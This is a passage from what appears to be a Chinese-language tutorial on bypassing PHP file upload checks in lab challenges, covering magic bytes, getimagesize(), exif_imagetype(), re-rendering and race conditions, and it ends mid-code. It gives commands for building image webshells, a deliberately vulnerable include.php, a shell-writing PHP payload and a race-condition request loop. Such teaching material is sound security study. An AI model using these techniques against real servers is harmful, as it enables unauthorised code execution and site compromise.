class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要是检测文件内容开始处的文件幻数，比如图片类型的文件幻数如下，</p>
<p>要绕过jpg文件幻数检测就要在文件开头写上下图的值：</p>
<p>Value = FF D8 FF E0 00 10 4A 46 49 46</p>
<p><img src="https://upload-images.jianshu.io/upload_images/15378294-c22107455ddd7217.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/639/format/webp"></p>
<p>要绕过gif 文件幻数检测就要在文件开头写上下图的值</p>
<p>Value = 47 49 46 38 39 61</p>
<p><img src="https://upload-images.jianshu.io/upload_images/15378294-5b20d65ed7622052.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/607/format/webp"><br>要绕过png 文件幻数检测就要在文件开头写上下面的值</p>
<p>Value = 89 50 4E 47</p>
<p><img src="https://upload-images.jianshu.io/upload_images/15378294-d22290e70f64e241.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/589/format/webp"></p>
<p>然后在文件幻数后面加上自己的一句话木马代码就行了</p>
<p><strong>绕过方法</strong></p>
<p>准备一张普通的图片和一句话木马</p>
<p>在命令控制行输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy image.jpg/b+test.php/a test.png</span><br></pre></td></tr></table></figure>

<p>生成的test.png就是我们制作好的图片马，上传即可</p>
<p>利用文件包含执行php代码</p>
<p>include.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=upload/xxx.jpg</span><br></pre></td></tr></table></figure>



<h4 id="突破getimagesize"><a href="#突破getimagesize" class="headerlink" title="突破getimagesize()"></a>突破getimagesize()</h4><p>通过<code>getimagesize()</code>函数获取文件类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types = &#x27;.jpeg|.png|.gif&#x27;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[2]);</span><br><span class="line">        if(stripos($types,$ext)&gt;=0)&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg = &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>准备一张普通的图片和一句话木马</p>
<p>在命令控制行输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy image.jpg/b+test.php/a test.png</span><br></pre></td></tr></table></figure>

<p>生成的test.png就是我们制作好的图片马，上传即可</p>
<p>利用文件包含执行php代码</p>
<p>include.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=upload/xxx.jpg</span><br></pre></td></tr></table></figure>



<h4 id="突破exif-imagetype"><a href="#突破exif-imagetype" class="headerlink" title="突破exif_imagetype()"></a>突破exif_imagetype()</h4><p>通过exif模块检测文件的类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>准备一张普通的图片和一句话木马</p>
<p>在命令控制行输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy image.jpg/b+test.php/a test.png</span><br></pre></td></tr></table></figure>

<p>生成的test.png就是我们制作好的图片马，上传即可</p>
<p>利用文件包含执行php代码</p>
<p>include.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=upload/xxx.jpg</span><br></pre></td></tr></table></figure>



<h4 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h4><p>这里综合判断了后缀名、content-type，以及利用<code>imagecreatefrompng</code></p>
<p>判断是否为图片，最后再做了一次二次渲染</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>准备一张图片，上传，再把上传之后的图片再次上传</p>
<p>通过工具对比三种图片的十六进制，我们确定这里对文件头部信息，文件扩展名，<code>content-type</code>对文件类型进行检测</p>
<p>如果该文件在规则设置之内，则通过模块<code>imagecreatefrompng</code>对文件内容进行二次渲染，然后重命名上传</p>
<p>我们通过对比三张图片，可以确定不被渲染的文件头部分和被渲染的主体部分</p>
<p>我们把一句话代码插入到文件头中，这样就不会被渲染掉</p>
<p>这里注意插入代码的位置，如果插入点正好是检测文件类型的那一部分，会导致判断不出文件类型，从而拦截</p>
<p>所以插入点位置尽量靠后，并且在冒号之后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">比如代码插入到了xxx(代码):xxx</span><br><span class="line">可能会被检测到文件类型异常</span><br><span class="line">需要手动修改为xxx:(代码)xxx</span><br></pre></td></tr></table></figure>

<p>利用文件包含执行php代码</p>
<p>include.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=upload/xxx.jpg</span><br></pre></td></tr></table></figure>



<h3 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h3><h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>条件竞争上传是一种服务器端的漏洞，由于后端程序操作逻辑不合理导致。<br>由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生，此漏洞一般发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">直接保存</button></li><li class="tab"><button type="button" data-href="#-2">白名单检测</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><p>文件先通过move_uploaded_file进行保存，然后用in_array判断文件是否为图片类型，如果是就用rename进行重命名，如果不是，则使用unlink删除文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>首先上传一个php文件，当然这个文件会被立马删掉，所以我们使用burp suite不断的进行上传操作，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
<p>先上传一个正常的图片，判断文件上传的地址</p>
<p>创建一个php文件，写入如下代码，该代码会生成一个包含恶意代码的php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,w),<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过burp suite不断进行上传操作，一边不断访问文件上传的地址，因为条件竞争关系，文件可能会在上传之后没有来得及改名</p>
<p>这里可以通过python脚本不断进行访问（也可以手动访问）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	req = requests.get(<span class="string">&quot;文件上传地址&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> req.status_code==<span class="number">200</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;访问成功，&quot;</span>+<span class="string">&quot;响应码：&quot;</span>+<span class="built_in">str</span>(req.status_code))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;test~&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>成功的时候，<code>shell.php</code>文件已经被写入，直接访问即可</p>
<p>如果存在文件包含，可以直接上传图片马，再进行文件包含</p>
<p>利用文件包含执行php代码</p>
<p>include.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=upload/xxx.jpg</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>这里先进行白名单判断，拒绝不在白名单里文件的上传操作，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">     